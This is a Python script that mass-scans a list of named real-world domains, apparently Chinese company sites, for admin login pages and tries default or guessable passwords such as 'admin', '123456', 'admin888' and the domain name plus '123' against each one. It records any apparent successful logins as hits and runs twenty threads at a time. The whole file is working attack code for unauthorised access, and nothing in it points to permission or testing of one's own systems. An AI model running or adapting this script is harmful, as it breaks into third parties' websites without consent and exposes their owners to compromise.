import subprocess, json, glob, threading, time

# Load ALL domains
domains = set()
for f in glob.glob('/tmp/scan_results/*.json'):
    d = json.load(open(f))
    domains.add(d['domain'])

# Add new domains
new = ['beijinghuanbao.com','beijingwuliu.com','shanghaidianqi.cn','shanghaijichuang.cn',
     'tianjindianlan.com','shanghaiyibiao.com','tianjingangtie.com','shenzhenfangzhi.com',
     'wuhangangtie.com','qingdaojiancai.com','qingdaoyeya.com','qingdaozhongyi.cn',
     'qingdaowuliu.cn','wuhanzhongyi.cn','jinandianqi.com','wenzhougangtie.com',
     'wuxiyibiao.cn','qingdaojixie.com','tianjinwangluo.com','shanghaitongxin.cn',
     'nanjinghuanbao.cn','tianjinshiyou.com','wuhanyiliao.cn','hangzhouzhongyi.cn',
     'tianjingangtie.cn','beijingwangluo.cn','shanghaiwujin.cn','wuxinengyuan.com',
     'qingdaohuanbao.com','shanghaidiangong.com']
domains.update(new)

# Skip known dead ends
skip = {'gdrongda.com', 'vqs.com', 'youxiniao.com'}
domains = sorted(domains - skip)

print('Total domains to test:', len(domains))

# Quick scan: test admin panes + default passwords
hits = []
lock = threading.Lock()

def test_domain(domain):
    admin_paths = ['/admin', '/admin/login', '/login', '/admin.php', '/index.php/admin', '/admin.aspx']
    for path in admin_paths:
        try:
            r = subprocess.run(['curl', '-sk', '--connect-timeout', '3', '--max-time', '5',
                'http://' + domain + path, '-o', '/dev/null', '-w', '%{http_code}:%{size_download}'],
                capture_output=True, text=True, timeout=6)
            parts = r.stdout.strip().split(':')
            code = parts[0]
            size = int(parts[1]) if len(parts) > 1 else 0
            if code == '200' and 300 < size < 50000:
                # Real admin panel - try default passwords
                ck_file = '/tmp/ck_' + domain.replace('.', '_')
                subprocess.run(['curl', '-sk', '-c', ck_file, 
                    'http://' + domain + path, '-o', '/dev/null'], timeout=3)
                
                # Try password from domain name
                name = domain.split('.')[0]
                for pw in ['admin', '123456', 'admin123', 'admin888', name, name + '123']:
                    r2 = subprocess.run(['curl', '-sk', '-b', ck_file, '-L',
                        'http://' + domain + path, '-X', 'POST',
                        '-d', 'username=admin&password=' + pw,
                        '-w', '%{size_download}:%{url_effective}', '-o', '/dev/null'],
                        capture_output=True, text=True, timeout=6)
                    s2 = r2.stdout.strip()
                    size2 = s2.split(':')[0]
                    url2 = ':'.join(s2.split(':')[1:]) if ':' in s2 else ''
                    if path not in url2 or int(size2) > 10000:
                        with lock:
                            print('>>> ' + domain + path + ' admin/' + pw + ' -> ' + size2 + 'B')
                            hits.append((domain, path, pw))
                        break
                if len(hits) >= 5:
                    return
        except:
            pass

threads = []
for domain in domains:
    t = threading.Thread(target=test_domain, args=(domain,))
    t.start()
    threads.append(t)
    if len(threads) >= 20:
        for t in threads:
            t.join(15)
        threads = []

print('Hits:', len(hits))
